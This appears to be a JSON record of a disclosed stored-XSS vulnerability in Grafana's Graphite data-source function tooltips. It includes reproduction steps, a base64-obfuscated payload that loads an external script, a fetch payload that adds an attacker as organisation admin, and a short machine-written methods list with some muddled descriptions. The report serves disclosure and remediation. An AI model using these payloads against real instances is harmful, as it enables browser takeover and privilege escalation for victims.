{"description": "### Summary\nWhen a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use `Functions`. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. \n\n### Details\n\n1. Spin up your own Graphite instance. I've done this using the `make devenv sources=graphite`.\n2. Now start a terminal for your Graphite container and modify the following file `/opt/graphite/webapp/graphite/render/functions.py` \n3. Basically you can pick any function but I picked the `aggregateSeriesLists` function. Modify its description to be `\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>`\n\nThe result would look like this:\n\n```python\ndef aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n```\n\n4. Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)\n5. Now login to your Grafana instance as an Organisation Admin.\n6. Navigate to http://[grafana]/plugins/graphite and click `Create a Graphite data source`\n7. Add the url to the attackers Graphite instance (maybe enable `Skip TLS Verify`) and click `Save & test` and `Explore`\n8. In the newly opened page click the + icon next to `Functions` and search for `aggregateSeriesLists` and click it to add it.\n9. Now hover over `aggregateSeriesLists` with your mouse and move your mouse to the `?` icon.\n\n### Result\n\nOur payload will trigger and in this case it will include an external script to trigger the alerts.\n\n#### Decoded payload\n\n```javascript\nvar a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n```\n\n![image](https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png)\n\n\n### Impact\n\nIn the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.\n\nAn example would be something like this:\n\n```javascript\nfetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": \"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n```\n\n### Mitigation\n\nThe vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx\n\n```typescript\nconst FunctionDescription = React.lazy(async () => {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return <div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} />;\n    },\n  };\n});\n```\n\nIn many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.", "methods": ["Used a vulnerable Graphite instance to host a malicious Graphite data source.", "Added a malicious Graphite function with a description containing a XSS payload.", "Used the `dangerouslySetInnerHTML` property to inject the XSS payload into the DOM.", "Used the `fetch` API to send a POST request to add an admin user.", "Used a reStructuredText parser (rst2html) that did not sanitize the input, allowing the XSS payload to survive.", "Used a React component (FunctionDescription) to render the malicious HTML.", "Used a Graphite instance to store and serve the malicious function.", "Used a Grafana instance to connect to the malicious Graphite instance and execute the XSS payload."]}